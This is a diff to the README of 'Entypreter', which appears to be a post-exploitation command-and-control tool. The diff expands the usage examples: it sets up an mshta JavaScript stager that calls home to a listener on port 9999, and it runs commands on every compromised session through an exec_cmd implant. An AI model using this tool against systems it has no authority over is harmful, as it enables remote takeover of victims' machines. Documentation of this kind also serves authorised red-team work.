@@ -47,23 +47,43 @@
     INFO: There are some Entypreter examples - 
     how to start Entypreter stager or implant.
 
-## Starting entypreter stager
+## Using entypreter stager
 
 > entypreter
 
     (entypreter: sta/js/mshta)# info
-    (entypreter: sta/js/mshta)# set SRVHOST <lhost>
-    (entypreter: sta/js/mshta)# set SRVPORT <lport>
+     
+            NAME       VALUE               REQ     DESCRIPTION     
+            -----      ------------        ----    -------------   
+            SRVHOST                        yes     Where the stager should call home.
+            SRVPORT                        yes     The port to listen for stagers on.
+            EXPIRES                        no      MM/DD/YYYY to stop calling home.
+            KEYPATH                        no      Private key for TLS communications.
+            CERTPATH                       no      Certificate for TLS communications.
+            MODULE                         no      Module to run once session is staged.
+        
+    (entypreter: sta/js/mshta)# set SRVHOST 0.0.0.0
+    [+] SRVHOST => 0.0.0.0
+    (entypreter: sta/js/mshta)# set SRVPORT 9999
+    [+] SRVPORT => 9999
     (entypreter: sta/js/mshta)# run
     
-## Starting entypreter implant
+## Using entypreter implant
 
 > entypreter
 
     (entypreter: sta/js/mshta)# use implant/manage/exec_cmd
     (entypreter: imp/man/exec_cmd)# info
+     
+            NAME        VALUE               REQ     DESCRIPTION     
+            -----       ------------        ----    -------------   
+            CMD                             yes     Command to run. 
+            OUTPUT      true                yes     Retrieve output?
+            DIRECTORY   %TEMP%              no      Writeable directory for output.
+            SESSION     ALL                 yes     The session to target.
+ 
+
     (entypreter: imp/man/exec_cmd)# set CMD ipconfig
-    (entypreter: imp/man/exec_cmd)# set session <session>
     (entypreter: imp/man/exec_cmd)# run
     
 ***
